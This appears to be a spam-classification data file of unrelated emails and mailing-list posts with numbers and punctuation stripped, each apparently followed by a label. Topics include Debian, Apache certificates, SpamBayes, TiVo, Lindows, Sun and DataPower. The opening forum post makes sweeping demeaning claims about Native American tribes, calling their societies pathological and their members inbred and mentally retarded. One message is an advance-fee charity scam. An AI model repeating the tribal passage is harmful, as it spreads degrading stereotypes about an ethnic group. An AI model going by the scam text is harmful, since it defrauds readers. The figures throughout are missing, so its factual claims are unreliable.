tribal members  who are more than happy take their dividend and not work   The dividend they receive from the corporation often constitutes their sole  income  for government accounting purposes   Unfortunately  to support this type of economics when no one works  they ve had to sell off most of their useful assets to maintain those dividends   Many of the tribes genuinely living in poverty do so because they have run out of things to sell yet nobody works   One of the ironies is that on many of the reservations where the tribes still have assets to burn  many of the people working in the stores and such are actually poor white folk  not Indians   Second  even though the tribe members each get a cash dividend  they also receive an enormous range of benefits and perks from the Indian corporation to the tune of tens of thousands of dollars per person annually   By benefits and perks  we are talking about the kinds of things no other ordinary American receives from either their employer or the government   It should be pointed out that while many of these Indian corporations are ineptly run  and mostly provide sinecures for other Indians  a minority are very smartly managed and a few hire non Indian business executives with good credentials to run their business divisions   An example of this is the Haida Corporation  which while having less       tribal shareholders  has billions of dollars in assets and the various corporations they own have gross revenues in the          million range  and growing    Yet the dividend paid out is strictly controlled  about    k in this particular case  and they engaged in a practice of waiting a couple decades before drawing money from any of the assets they were granted which has led to intelligent investment and use   They don t eat their seed corn  and have actually managed to grow their stash   In contrast  a couple islands over  there is another tribe of        people that has a net loss of about     million annually IIRC while being regularly endowed by the Federal government with several billions of dollars in valuable assets   This particular tribe has a modest income in theory  but the actual expenditures per person annually is in the hundreds of thousands of dollars  and many borrow money against future income   Incidentally  in this particular case  the people that ARE working frequently pull in a few hundred thousand dollars a year  much of which goes back to the tribal corporation rather than their own pockets   Somewhat annoying  the Federal government semi regularly grants valuable assets to these tribes when they ve burned through the ones previously given where feasible  typically selling the assets to American or foreign companies   And the cycle continues   So what is the primary problem for the tribes that have problems   In a nutshell  a thoroughly pathological culture and society   Few women reach the age of    without getting pregnant   Incest  rape  and gross promiscuity is rampant   Inbreeding  heavy drug abuse during pregnancy  and other environmental factors have created tribes where a very substantial fraction of the tribe is literally mentally retarded   Many of the thoughtful and intelligent tribe members leave the reservation at the earliest opportunity  mostly to avoid the problems mentioned above   On one reservation my parents lived  the HIV infection rate was        Many of these societies are thoroughly corrupt  and the administration of the law is arbitrary and capricious  they do have their own judges  courts  police etc    In short  many of these tribes that are still hanging together are in a shambles because they have become THE most pathological societies that I have ever seen anywhere   Because of their legal status  there really aren t that many consequences for their behavior   There are many things that I could tell you that I ve seen that you probably would not believe unless you d seen it yourself   There are always good people in these tribes  but it has gotten to the point where the losers and idiots outnumber the good guys by a fair margin many times  and this IS a mobocracy typically    BTW  if any of you white folk wants to experience overt and aggressive racism as a minority in a place where the rule of law is fiction and the police are openly thugs  try living on one of these messed up Indian reservations   It will give you an interesting perspective on things    There are only two real situations where you find reasonably prosperous Indians   The first is in the rare case of tribes run by disciplined and intelligent people that have managed their assets wisely   The second is where the tribe has dispersed and assimilated for the most part  even if they maintain their tribal identity   In both of these cases  the tribal leaders reject the insular behavior that tends to lead to the pathological cases mentioned above   The Indians are often quite wealthy technically  and a lot of money is spent by the tribe per capita   And the actual reportable income is quite high when you consider how many are living entirely off the tribal dole   It is just that their peculiar economic structure does not lend itself well to ordinary economic analysis by merely looking at their nominal income   The poverty is social and cultural in nature  not economic   This was my original point    On a tangent   One thing that has always interested me is the concept of quasi tribal corporate socialism   Many Indian tribes implement a type of corporate socialism that is mind bogglingly bad in execution   That they use this structure at all is an accident of history more than anything   But what has interested me is that the very smartly managed ones do surprisingly well over the long run   It is like a Family Corporation writ large   It seems that in a future where  familial  ties will be increasingly voluntary  the general concept may have some merit in general Western society  serving to create a facsimile of a biological extended family with the included dynamics  but with an arbitrary set of self selecting individuals   Damn that was long  and its late   and it could have been a lot longer

Securing multiple virtual hostsI am trying to secure three of four virtual hostnames on our Apache server  We are not taking credit card orders or user s personal information  but are merely hoping to secure email and calendar web transactions for our users  We are not running any secure applications on the root host   I have been testing this week with CA  client  and host certificate requests  certificates  and keys  and think I have a fairly good beginner s grasp of the commands and command line options    My questions are       Is it necessary to create a CA certificate for each of the secure virtual hosts  or can one CA certificate for the root be used to sign each of the keys for all three common names we are trying to secure       Even though the root host is not conducting secure transactions  am I correct in configuring the server with a CACertificateFile in the main body of httpsd conf and then setting the CACertificateFile for each virtual host in the  section of httpsd conf   This sort of assumes the answer to    is    you need a CA for each virtual host       Is it necessary to create a client certificate to distribute to our users  or is it sufficient to have the CA certificate and a server certificate for the virtual hosts   Wouldn t a client certificate only be necessary if we were trying to verify the client s identity   Would that be a good idea given our scenario   Thanks in advance for your help    ______________________________________________________________________ OpenSSL Project                                 http   www openssl org User Support Mailing List                    openssl users openssl org Automated List Manager                           majordomo openssl org  ,1

Lindenmayer Systems in Python provides a simple implementation of Lindenmayer systems  also called  L systems  or  substitution systems    In basic form  a Lindenmayer system consists of a starting string of symbols from an alphabet which has repeated transitions applied to it  specified by a list of transition search and replace rules  In addition to the standard formulation  two alternative implementations are included  sequential systems  in which at most one rule is applied  and tag systems  in which the transition only takes place at the beginning and end of the string   Despite being implemented entirely in Python  for reasonable rules on a modern machine  the system is capable of running thousands of generations per second  Lindenmayer systems are found in artificial intelligence and artificial life and can be used to generate fractal patterns  usually via mapping symbols from the alphabet to turtle commands   organic looking patterns that can simulate plants or other living

all at once with a single API function controlled by a compact syntactical description of the channel tree  For generating log messages  a printf style formatting engine is provided which can be

Re  Boot   LVM best practices    If you re going to buy two drives  you d be stupid to not use      mirroring for fault tolerance and a little added read performance      here and there  depends on application       I disagree   Mirroring only protects you against drive failures and not     human error     And I disagree with that     With the fact that it s not necessarily stupid to not use mirroring       Mirroring  definitely  makes both reads and writes go faster  due    to parallelism     AFAIK that s not true for writes  they may even slow down slightly    But in any case  this does not contradict the fact that the kind of  protection it offers is different from the one offered by using backup               Stefan           To UNSUBSCRIBE  email to debian user REQUEST lists debian org   with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org jwvtyrdlw c fsf monnier gmane linux debian user gnu org      ,1

Movie Gear v     [    k] W X NT W K XP      http   www moviegear com gmgdet htm   The majority of GIF animation on the Web does absolutely nothing for  me  I m of the mindset that animation is meant to either tell a story  or illustrate a concept    not put something in motion just because  you can  That said  for anyone wanting to create animations  this tool  makes it nice and easy  A storyboard interface keeps you thinking like  a movie maker as you build your animated creations  which lends itself  to helping anyone who d like to get from point A to point B in an  orderly fashion  The software supports PSD  JPG  AVI  BMP  and GIF  formats  leaving your options open for creating animated segments        GnomeFEATURE Madshrimps Extreme CDROM Testing  http   www madshrimps com

Reviewer s Tilt           Two out of work rent a cops make an attempt to break into the music  video industry in this quirky comedy  John Cusack and Tim Robbins  make this comedy work  starring as the two security guards as they  send up all sorts of Hollywood stereotypes  You can t help but laugh  at the ridiculous predicaments these two survive  as they are  greeted with cameos by a who s who of music and movie industry names   I m sure neither Robbins nor Cusack would openly list this movie on a  resume  but it is indeed a brilliant performance by both of them   especially as a demonstration of their ability to play off of each  other  Although this is a late    s release  one of the few    s  underground classics I hadn t previously seen   it remains relevant  to those out there who are

               http   rs  net tn jsp t tpysjsn  e iqjsn  wxb wqn  p http  A  F  Fwww tvpredictions com  Fpredictions html Ready for this   The next five months could determine whether  TiVo  the Personal Video Recorder service  ultimately survives as a business   TiVo  which launched five years ago  has less  than         subscribers  The company s stock dipped below three this week  And network execs are openly questioning whether the digital recorder  which permits skipping commercials with a few  clicks of the remote  will destroy their advertising models  There even have been hints that the  networks could support a move by the cable  industry to offer a PVR that does not permit commercial skipping  And that PVR would not  be a TiVo    To its credit  TiVo has been remarkably successful  at building brand loyalty and awareness  TiVo  reports that    percent of its subscribers have recommended the service to a friend  And when people talk about PVRs  they say TiVo   Just  like the way people say  Coke  when they talk about soft drinks     But Wall Street  the media and the industry  are all growing impatient  TiVo needs to start putting some big numbers on the board     and it needs to do it this holiday season  If  it doesn t  stock analysts who have supported TiVo  until now will run for the hills  That will push the company s stock price down even further  And if that happens  TiVo could have just two choices  Sell the company under duress or wait until its  funding dries up    Consequently  I predict that TiVo will launch  an intensive marketing blitz over the next  five months  right through the holiday season  The blitz will include a sharp increase in  retail distribution  TV advertising and PR  efforts  The company needs to show Wall  Street    and the industry    that it will be  the brand leader in the PVR category  And it needs to show that it can generate mass consumer demand    How does TiVo demonstrate that   Anything short of         subs at year s end will have people questioning whether TiVo has the right stuff  Cable execs  who are watching TiVo closely  might decide that adding the  service is not such a great selling point  after all  And Echostar  which currently does not have an agreement with TiVo  may decide to stay with its unbranded PVR service after  its merger with DIRECTV is approved in D C    TiVo currently has a partnership with DIRECTV  but it s unclear what will happen to the deal if  the merger is approved     So there is much at stake    and it s not extreme to say that TiVo s ultimate future could be decided in the next several months    Will it succeed  I predict that TiVo will achieve a partial success  The company will boost its  subscriber numbers and it will maintain its claim as the    PVR service  However  in time  I  also predict it will decide to sell the company to a large media outfit  such as Sony or perhaps even Liberty Media  This would give TiVo the  necessary funding and industry connections for long term growth and survival   To see more predictions on the future of TV   click below                                         Breaking News

Re  Replace hardware without reinstall debian lennyOn Tue     May                      Lisi wrote       On Tuesday    May               Tom H wrote          I am sure someone will correct me if I have got this wrong  so if       noone does so I have probably remembered correctly          I don t remember a thread on debian user about UUIDs changing with     changing hardware  I could be wrong though   but there was a thread in     March on ubuntu users where a guy was duplicating disks for a rollout     and he was convinced that the BIOS of the boxes into which he was     plugging in the duplicated HDs was changing the UUIDs of the disks      partitions because he was unable to boot from those disks unless he     changed the fstab to use  dev sdaX devices  I pointed out that the idea     that a BIOS could change a filesystem s superblock didn t make any     sense and that it could not be a UUID problem because he could boot     boxes with Intel mobos but not boxes with another manufacturer s mobos      I assume that he could have replied that the other mobos were changing     the UUIDs and the Intels ones not             Thanks  Tom   I may be getting confused with that     No  Lisi  you are right  Here is the thread          question about fstab in squeeze and uuid  http   lists debian org debian user         msg      html         But using  labels  can lead to another problems  I m afraid there is no    one size fits all  here        Greetings          Camale  n           To UNSUBSCRIBE  email to debian user REQUEST lists debian org   with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org pan                     csmining org      ,1

[Spambayes] test sets     I also looked in more detail at some f p s in my geeks traffic   The     first one s a doozie  that s the term  right        It has lots of     HTML clues that are apparently ignored          The clues below are  loaded  with snippets unique to HTML  like       I  meant  to say that they were      clues cancelled out by      clues   But that s wrong too   It looks I haven t grokked this part of your code yet  this one has way more than    clues  and it seems the classifier basically ended up counting way more      than      clues  and no others made it into the list   I thought it was looking for clues with values in between  apparently it found none that weren t exactly         That sure sets the record for longest list of cancelling extreme clues   This happened to be the longest one  but there were quite a few similar ones   I wonder if there s anything we can learn from looking at the clues and the HTML   It was heavily marked up HTML  with ads in the sidebar  but the body text was a serious discussion of  OO and soft coding  with lots of highly technical words as clues  including Zope and ZEO      That there are  any       clues in here means the scheme ran out of   anything interesting to look at   Adding in more header lines should   cure that   Are there any minable but unmined header lines in your corpus left  Or do we have to start with a different corpus before we can make progress there       The seventh was similar          I scanned a bunch more until I got bored  and most of them were either     of the first form  brief text with URL followed by quoted HTML from     website       If those were text plain  the HTML tags should have been stripped   I m   still confused about this part   No  sorry   These were all of the following structure     multipart mixed       text plain         brief text plus URL s         text html          long HTML copied from website   I guess you get this when you click on  mail this page  in some browsers     That HTML tags aren t getting stripped remains the biggest mystery to me   Still     This seems confused  Jeremy didn t use my trained classifier pickle    he trained his own classifier from scratch on his own corpora    That s an entirely different kind of experiment from the one you re   trying  indeed  you re the only one so far to report results from   trying my pickle on their own email  and I never expected  that  to   work well  it s a much bigger mystery to me why Jeremy got such   relatively worse results from training his own    and he s the only   one so far to report results from  that  experiment    I think it s still corpus size     Guido van Rossum  home page  http   www python org  guido   ,1

Re  [Baseline] Raising chickens the high tech wayThosStew aol com writes     In a message dated                   PM  dl silcom com writes        If we re willing to count artificial    selection as genetic engineering        Of course was genetic engineering  It used the fundamental mechanism of    genetics  inheritance of traits   and not randomly  but    intentionally  breeding for long fur  fat hams  whatever  The degree to which    the engineers  farmers  breeders  understood exactly how the mehcanism works    is only marginally relevant to the question of whether it was engineering    Naw  I still disagree  again because if I m going to be so loose with the definitions  then I d have to say that I myself am a genetically engineered organism   But I m natural  baby   My parents were attracted to each other s phenotypes  mixed some genes in the hopes that those genotypes would get in there  and grew me around them   Sure  they engineered the process when they selected each other   But they didn t engineer the genetics   If genetic enginering wasn t such an important topic today  it wouldn t be such an important distinction   I guess that the reason that I disagree is that some groups arguing against any checks on genetic engineering use that same argument    we ve been doing it since prehistory  so we don t need to apply any caution today        Karl Anderson      kra monkey org           http   www monkey org  kra  http   xent com mailman listinfo fork   ,1

disagreement to my comments or  those of citizens of other countries  You re following me  right  People would  disagree with an article that said we spend much time disagreeing  This  of  course  would prove my point in a somewhat metaphorical way   the perfect  recursive metaphor  The point was to be made yet more perfectly by the eventual  inclusion in Penguin Shell of the comments of someone from outside the US      disagreeing with my take our argumentativeness as Americans  Ideally  they would      be comments that disagreed with our collective American perception of being  disagreeable  They would  of course  point out things about which citizens of  other countries can disagree with Americans on  By exercising the right to  disagree  we d subtly agree that we have that right  Yet another level of  recursion and a final layer of metaphor   The response to both my own and Johan Sauviller s comments was overwhelming  In  the main  I believe both were appreciated  Many commented on the balance of the  two pieces  Some readers were surprised  I think  to see a dissenting opinion  published so quickly  if at all  Overall  the ability to express honestly held  opinions  to agree and to disagree on a global level closed the circle on the  metaphor in a perfect way   Things have  however  gotten a bit more ugly in the past few days  I m not sure  whether some were slow in getting to the July  rd issue  or whether it s just  been stewing since then  Take  for instance  these comments by a reader who will      remain mercifully nameless    We get enough America bashing from our left wing whacko extremist press and schools here in the USA that we don t wish to hear some  insert favorite adjective here  from Belgium whining too    Followed by        please don t let Tony single handedly tarnish the fine reputation of Lockergnome  I m sure there are other articulate Linux experts out there who  would be able to replace him        and  in a later note on the topic       Censorship is to be encouraged in a free market society whenever and wherever it doesn t come from the government    Clearly  the metaphor just whizzed right over the heads of some   Chris      has been great about allowing all his authors plenty of room in the editorial  piece at the beginning of each newsletter  This particular piece is no  exception  He s shown a quiet confidence in the face of some very shrill  comments  While we all generally stay focused on technical issues  Chris has  shown unwavering support for the notion that we geeks are  in the end  humans  with opinions and thoughts to share  I think it s one of the things that makes  the Lockergnome newsletters stand out from the pack   the personal touch   So  despite the irrationality of some of this week s comments  I ll continue to  occasionally throw in a personal aside with the technical stuff   Just watch out  Recursive metaphors are only funny until someone puts an eye  out   Tony Steidler Dennison

Regular price      SPECIAL OFFER for Lockergnome readers  get  your set TODAY  ONLY          Win Apps in Linux   Yesterday  I mentioned an interesting review of two products for Linux by CodeWeavers   CrossOver  Office and CrossOver Plugin  You ve probably heard of both by now  as they ve  garnered quite a bit of publicity both in and out of the Linux world  You ll  recall that I promised to try to secure copies for review this week  With the  help of a friendly sales rep at CodeWeavers  I was able to accomplish that task  this morning  True to the second half of the promise  we ll spend the next few  days looking at these two products and how they might impact your Linux use   Let s take them in chronological order  starting today with CrossOver Plugin   A bit of background is in order  CodeWeavers is  in their own words        the  leading corporate backer of the Wine Project  Wine has been  for the past several years  an  ongoing project to port Windows applications to Linux  It s a tough goal  but  it s also one that s been undertaken by others in the past year or so  Though the progress has been  slow  the Wine project has managed to stay at the front of this development  realm   CrossOver  Plugin marks a change in the philosophy of the Wine Project  Prior to its  release  Wine had taken a  full system  approach  Running Windows applications  in Wine required the installation of a sizeable daemon and no small amount of  configuration work  CrossOver Plugin has moved Wine away from the system wide  approach to one that s much more modular  Rather than executing at system  startup  Wine is called as needed  with the virtual Windows path to the called  program  When the program is closed  so is Wine  CrossOver Plugin has focused on     creating Linux functionality with one related set of Windows  applications  browser plugins   The results stand as a clear indication that the change in philosophy is a  success  Off the top  CrossOver Plugin bundles QuickTime    Windows Media Player          Shockwave      Flash    and RealPlayer   into a Linux accesible browser  plugin package  Throw in more esoteric apps like IPix  Trillian  Authorware Web  Player   and eFax Messenger    and you ve got virtually every need plugin need  covered   But this package doesn t stop there  Included in the CrossOver Plugin package  are viewers for Word  Excel and Powerpoint  as well as several  Microsoft oriented fonts  Honestly  I was stunned at the range of applications  offered by the CodeWeavers developers   Having had some experience with Wine  I was a bit leery about the install  process and about the ability to get all these great applications to work with  my RedHat setup  I ve never been completely successful with Wine  but I hoped  for the best when I started the CrossOver Plugin installation  I really did want     these apps to work   The installation was quite easy  By running the install crossover sh script from     the command line  I was able to install the installers for both CrossOver Plugin     and CrossOver Office  which we ll talk about tomorrow  I started the plugin  installs with QuickTime  a tool I ve admittedly missed in Linux  In the  background  CrossOver Plugin had already created a virtual C \ drive on my  machine  I clicked on the QuickTime install and immediately saw a familiar sight       the Vise installer in its Windows format  CrossOver Plugin first checked for  feedback from the Windows binary  opened a virtual Windows window  then stepped  out while the Vise installer took care of the rest  Though the install failed  four times  it appeared to be a server failure rather than a failure of the  CrossOver program  I kept  retry ing and  with some persistence  managed to get  a full QuickTime   install downloaded from the Apple servers  Quite literally   the install looked and performed exactly as I ve seem many times in Windows   When the install was completed  CrossOver again checked for the Windows binary   located the appropriate  dll files in the virtual C \ drive and dropped the  plugins into the  home tony  netscape plugins and  home tony  mozilla plugins  directories   The process was so smooth that I had to check the plugin listings in these  browsers    Help    About Plugins   Sure enough  the CrossOver QuickTime plugin  was listed  Quickly  I ran out to the Apple site and opened the  Men In Black  II  movie trailer  QuickTime performed flawlessly   I followed with the Windows Media Player  Shockwave  Flash  IPix  and eFax  Messenger installs  Of those  the only ones that weren t self contained in the  CrossOver install were IPix and eFax  Even at that  the installer pointed me to  the Windows download then found the  exe file when the download was done  Within     a half hour  I had all installed and tested   Then  just for grins  I installed RealPlayer   via CrossOver  This was despite  the recommendation in the installer screen to use the Linux version  It went as  smoothly as the others with one caveat   the player played media files at a much     faster speed than that in Windows  Fast enough to make me laugh  in fact   reminded of Dave and Alvin the Chipmunk  Ah well  six out of seven is pretty  strong given my previous troubles with Wine   I also installed a few fonts   Arial  Times New Roman  Trebuchet  and Veranda   In every case  the install was quick and absolutely painless   Wine has always held great promise  At times  it s been painful to watch the  tedious pace of development  only because that promise was so alluring  With the     backing of CodeWeavers and a fundamental change in the approach to development   Wine has finally realized the goal of integrating Windows applications  seamlessly into the stable Linux environment  The results are so strong that  if     I didn t know better  I d swear that a few of these plugins actually run better  in Linux than in their native Windows  Honestly  I didn t realize how much I  missed them until I started using them in Linux today   Tomorrow holds a few surpirses  with a look at CodeWeavers  CrossOver Office  package   Recommend It  Send us a

configuration  screens one at a time in an attempt to shed some light on the purpose and  function of each  With that knowledge  you should be able to make a clear  decision as to how to configure each section   Today  it s the Parallel Port support section  This is pretty simple  If you  need parallel port support   such as for a printer   select this option either  as a driver built into the kernel or as a loadable module   Most will use the PC style hardware option in conjuction with a Windows printer      But that s not all the parallel port can be used for  As an example  the builds  I did with the telescope company required parallel port support  as the  telescope cameras were attached to this port   Be aware   this kernel configuration option only makes a driver available for  the parallel port  The computer s BIOS sets the mode for the port   ECP  EPP  or     Auto  On the majority of modern computers  the Auto mode is the default and will     work just fine  However  if you have problems communicating with your printer  following a kernel recompile  try changing the mode of your printer in the  BIOS   Tomorrow  it s Plug and Play configuration   Recommend It  Send us a

[spam] [SPAM]  Charity MoneyDear Friend     As you read this  I don t want you to feel sorry for  me  because  I believe everyone will die someday   My name is MR Wahid Adada a Crude Oil merchant in IRAN i  have been diagnosed with Esophageal cancer    It has defiled all forms of medical treatment  and  right now I have only about a few months to live   according to medical experts   I have not particularly lived my life so well  as I  never really cared for anyone not even myself but my  business  Though I am very rich  I was never  generous  I was always hostile to people and only  focused on my business as that was the only thing I  cared for  But now I regret all this as I now know  that there is more to life than just wanting to have  or make all the money in the world   I believe when God gives me a second chance to come  to this world I would live my life a different way  from how I have lived it  Now that God has called  me  I have willed and given most of my property  and assets to my immediate and extended family  members as well as a few close friends   I want God to be merciful to me and accept my soul  so  I have decided to give alms to charity  organizations  as I want this to be one of the last  good deeds I do on earth  So far  I have distributed  money to some charity organizations in Austra  cameroun   liberia Algeria and Malaysia  Now that my health has  deteriorated so badly  I cannot do this myself  anymore  I once asked members of my family to close  one of my accounts and distribute the money which I have  there to charity organization in Bulgaria and  Pakistan  they refused and kept the money to  themselves  Hence  I do not trust them anymore  as  they seem not to be contended with what I have left  for them     The last of my money which no one knows of is the  huge cash deposit of fifteen million dollars                 that I have with a finance Security  Company abroad  I will want you to help me collect this  deposit and dispatched it to charity organizations       I have set aside     for you and for your time     God be with you     MR Wahid Adada      ,0

Lindows com  Michael s Minute  Do the Math   Dispel the MythsFrom nobody Wed Mar                  Content Type  text plain   charset  us ascii  Content Transfer Encoding   bit  If this message is not displaying properly  click here  to launch it in your browser      Michael s Minute  Do the Math   Dispel the Myths   A reporter came by the Lindows com   offices last Friday  He told me that he wanted to try and use  LindowsOS to write a story  but he didn t think it was possible because his office used Microsoft Word  doc files  I asked him to have a seat and watch     I turned on the Walmart com  computer and then clicked on the running man   which took me to the Click N Run Warehouse   where I installed OpenOffice   using Click N Run  I then clicked the  Run It   button which opened the word processor OpenOffice Writer  I then typed  Linux is ready for the desktop and consumers can save hundreds using LindowsOS   I selected  Save as Microsoft Word    The reporter was not only surprised  he was amazed  Like many reporters  he was under the impression that Linux was only for servers  The simple word processor demonstration went a long way to show him otherwise  For Linux to become a driving force in desktop computing it will have to overcome a couple of myths    The first myth is that Linux is too hard to install and configure  That may have been true in the past  but we ve annihilated this myth with the latest version of LindowsOS   which installs on most machines in under   minutes  It s point  and shoot easy   easier than any other operating system  Microsoft products included   See for yourself at       The other myth is that Linux is just for the server and none of the graphical programs   which desktop users have come to rely on   exist  Not only have many of the Linux software programs made quantum leaps over the last couple of years  but they ve gotten quite good at reading and writing Microsoft formats  The easiest way to experience these products is via the Click N Run   Warehouse    Here s a quick list of some of the quality programs available today in the Warehouse  all downloaded and installed with a single click   OpenOffice   This one installation will equip a computer with an impressive collection of productivity programs each of which will open the corresponding Microsoft file format and allow you to edit files and swap them with Microsoft counterparts   Programs included are   OpenOffice Writer   Word processor  reads Microsoft Word docs   OpenOffice Calc   Spreadsheet  reads Microsoft Excel   OpenOffice Impress  Presentation package  reads Microsoft PowerPoint  OpenOffice Draw   A vector based drawing program  Click here   for a great tutorial on getting to know OpenOffice   GIMP  If you are familiar with Adobe s Photoshop  you ll want to Click N Run GIMP  It s a powerful image editor      Evolution  For those used to Microsoft s Outlook email program Evolution will make them feel right at home  Check out how easy it is to use     Flowchart Pro  which is similar to Microsoft s Visio  is a  rich charting program that makes it possible to create flow charts and organizational charts  plus more  See how easy it for yourself  visit Flowchart Pro at   This is just a handful of the quality programs available in the Warehouse  that make Linux a practical choice for the desktop today  And if you re still not convinced  then do the math     For  a total cost of         including all  software  computer users save  more than       for a complete system    With such major price differentials between the two similarly equipped systems  any business  school or home will find their computing dollars stretched much further running LindowsOS    Michael Robertson  Please visit   to answers questions you may have about LindowsOS or Lindows com   Bringing Choice to Your Computer    LindowsOS is presently available on LindowsOS Certified Computers being offered from Lindows com   Builder partners   The General Release of LindowsOS  available now for download and preview to Lindows com   Insider partners  will be made available later this year for those wishing to install and run LindowsOS on their existing computer hardware   The General Release version will support a wider range of computer hardware and includes unique features such as a  Friendly Install  alongside an existing MicrosoftR Windows operating system  a streamlined installation process which requires no computer knowledge  and the ability to run a select set of  bridge  Windows compatible programs  For more information see    LindowsOS and Lindows com are trademarks of Lindows com  Inc  LinuxR is a registered trademark of Linus Torvalds  MicrosoftR WindowsR operating system is a registered trademark or service mark of the Microsoft Corporation   mm    ___________________________________________________________ To change your mailing list options please go to   ,1

Sun Nabs Storage Startup   buys Pirus Networks Related to the MS acquisition of XDegrees      http   www internetnews com infra article php          Sun Nabs Storage Startup By Clint Boulton Amid the flurry of news at its own SunNetwork      conference in San Francisco  Sun Microsystems Thursday said it has agreed to purchase data storage concern Pirus Networks for an undisclosed amount of stock   The Palo Alto  Calif  networking firm bought the Acton  Mass  based startup with a keen eye for the startup s switching  define  devices and virtualization technology  Used as part of a storage area network  define   virtualization is the pooling of storage from many network storage devices into what appears to the operating system to be a single storage device that is managed from a central console   Though major vendors make similar technology  Pirus competes with the likes of Rhapsody Networks and Confluence Networks  Sun plucked Pirus after scouting some    companies   Mark Lovington  vice president of marketing for Pirus  told internetnews com that Pirus and Sun have been in discussion for a while about a possible acquisition  Pirus  he said  succeeded in a goal it shares with a lot of storage startups    to be acquired by one of the major systems vendors  such as Sun IBM  HP  Hitachi    This is a huge opportunity for Pirus in a storage market dominated by     or   system level players   Lovington said   Sun sees this acquisition as a critical element to their N  initiative  The synergies were quite obvious    N  is Sun s hopeful tour de force in distributed computing  define  architecture  which involves multiple  remote computers that each have a role in a computation problem or information processing  N  is being styled as the answer for companies looking to manage groups of computers and networks as a single system    at a lower cost and with greater flexibility   While lagging behind other  more entrenched players  Sun is gaining ground in the storage market with its Sun StorEdge Complete Storage Solutions  according to a new report by IDC  John McArthur  group vice president of IDC s Storage program  said Sun Microsystems and IBM posted the largest increases in total storage revenue over Q        with     and     gains  respectively  As of Q   Sun held a   percent market share  with revenues of      million   Sun s acquisition of Pirus is expected to close in the second quarter of Sun s      fiscal year  which ends December              ,1

RE  Slaughter in the Name of God   From  Stephen D  Williams [mailto sdw lig net]   Sent  Monday  September               PM        Which religion and how it is currently being expressed matters        A   Which religion is it that can claim no foul actions in its past     Certainly not Christianity  Islam  etc   Hence the qualifier  current      B   How it is currently being expressed  amounts to a tacit   acknowledgement that the sophistication of the society involved and   people s self limiting reasonableness are important to avoid primitive   expression   This leads to the point that religion and less   sophisticated societies are a dangerous mix   It also tends to invoke   the image of extremes that might occur without diligent maintenance of   society   The tacit acknowledgement and self limiting you speak of is not a given or a function of  sophistication  but is primarily a feature of  current  Western Civilization   Of course   sophisticated  and  Western Civilization  are essentially equivalent IMHO   But it need not be so     D  The Northern Ireland Protestant vs  Catholic feud  recently more or   less concluded  is not completely unlike this kind of friction generated   by splitting society too much along religious lines   One Post article   pointed out that the problem basically stemmed from the vertical   integration of areas along religious lines all the way to schools    government  political party  etc    Of course both cases have a heritage   of British conquest  but who doesn t    And sometimes the religious component is a fa ade for an equally dangerous ethnic affiliation   Hindu extremism isn t about the Hindu religious theology as far as I can see   It is a peg to hang an ethnic identity and identity politics on   Muslim extremism appears to have a far greater connection to theology      Northern Ireland is a British province of green valleys and   cloud covered hills whose     million people are politically and   religiously divided  About    percent of the population is Protestant    and most Protestants are unionists who want the province to remain part   of Britain  The Roman Catholic minority is predominantly republican  or   nationalist  they want to merge with the Republic of Ireland to the south   Yep  all because the Scots ate oats and starved their Irish out long ago  while the English preferred wheat and that doesn t grow so well in Ireland   That and the introduction of potatoes saved the Irish as Irish     That s fine  as it would be an inappropriate concentration   It would be   difficult to address the issues raised here in a clean way   I d be   happy with an acknowledgement that the connection is there   Oh  I think we are in a war with wide aspects of the Muslim religion   I know it is there  but it just might not be appropriate to admit it publicly         US Leadership remains reflexively multi cultural        This is ok to a point  as long as it doesn t shy away from logical    objective analysis of when a society could be seriously improved in   certain ways   I didn t say this was a  good  thing   With the exception of ethnic restaurants  I can generally be counted on to oppose anything labeled  multi cultural       I didn t say burning the train was a good thing   I said I understood it    wasn t a spontaneous attack on people who had done no wrong           True  although I don t think you were as clear originally        I m sure I wasn t     ,1

DataPower announces XML in siliconNo analysis yet    don t know what to make of it yet  But here s the raw  bits for all to peruse and check out what s really going on    Best   Rohit                                                               DataPower delivers XML acceleration device By Scott Tyler Shafer August               am PT  DATAPOWER TECHNOLOGY ON Monday unveiled its network device designed  specifically to process XML data  Unlike competing solutions that  process XML data in software  DataPower s device processes the data in  hardware    a technology achievement that provides greater performance   according to company officials   The new device  dubbed DataPower XA   XML Accelerator  is the first in a  family of products expected from the Cambridge  Mass  based startup  The  DataPower family is based on a proprietary processing core technology  called XG  that does the analysis  parsing  and processing of the XML  data   According to Steve Kelly  CEO of DataPower  the XA   Accelerator was  conceived to meet the steady adoption of XML  the anticipated future  proliferation of Web services  and as a means to share data between two  businesses    Our vision is to build out an XML aware infrastructure   Kelly said    The XA   is the first of a family    Kelly explained that converting data into XML increases the file size up  to    times  This  he said  makes processing the data very taxing on  application servers  DataPower believes an inline device is the best  alternative   In addition to the large file sizes  security is also of paramount  importance in the world of XML    Today s firewalls are designed to inspect HTTP traffic only   Kelly  said   A SOAP packet with XML will go straight through a firewall   Firewalls are blind to XML today    Future products in DataPowers family will focus more specifically on  security  especially as Web services proliferate  Kelly said   According to DataPower  most existing solutions to offload XML  processing are homegrown and done in software    an approach the company  itself tried initially and found to be inadequate with regards to speed  and security  After trying the software path  the company turned to  creating a solution that would process XML in hardware    Our XG  execution core converts XML to machine code   said Kelly   adding that to his knowledge no other company s solution does  Kelly  said in the next few months he expects the market to be flooded with  technologies that claim to do XML processing    claims that he believes  will be mostly false  Other content aware switches  such as SSL  secure socket layer   accelerators and load balancers  look at the first    bytes of a packet   while the XA   provides deeper packet inspection  looking at       bytes  and thus enabling greater processing of XML data  Kelly explained   The  U high network device has been tested against a large collection of  XML and XSL data types and can learn new flavors of the markup language  as they pass through the device   The XA   can be deployed in proxy mode behind a firewall and a load  balancer  and it will inspect all traffic that passes and will identify  and process those packets that are XML  Kelly said   In addition to proxy mode  the device can also be used as an application  co processor  This deployment method gives administrators more granular  control over what data is inspected and the application server itself  controls the device   DataPower is not the only company chasing this emerging market  Startup  Sarvega  based in Burr Ridge  Ill   introduced the Sarvega XPE switch in  May  and earlier this month Tarari  an Intel spin off  launched with a  focus on content processing and acceleration  The DataPower device is now available  priced starting at          The  company has announced one customer to date and says the product is in  field trails at a number of other enterprises                                                                              DataPower has been addressing enterprise networking needs since it was  founded in early      by Eugene Kuznetsov  a technology visionary who  foresaw the adverse effects XML and other next generation protocols  would have on enterprise networks  Long before industry interest in XML  grew  Kuznetsov assembled a team of world class M I T  engineers and  designed the industry s first solutions to address the unique  requirements for processing XML  The first such solution was a software  interpreter called DGXT  This software based approach to XML processing  is still licensed by many companies for use in their own products today   Leveraging the detailed knowledge and 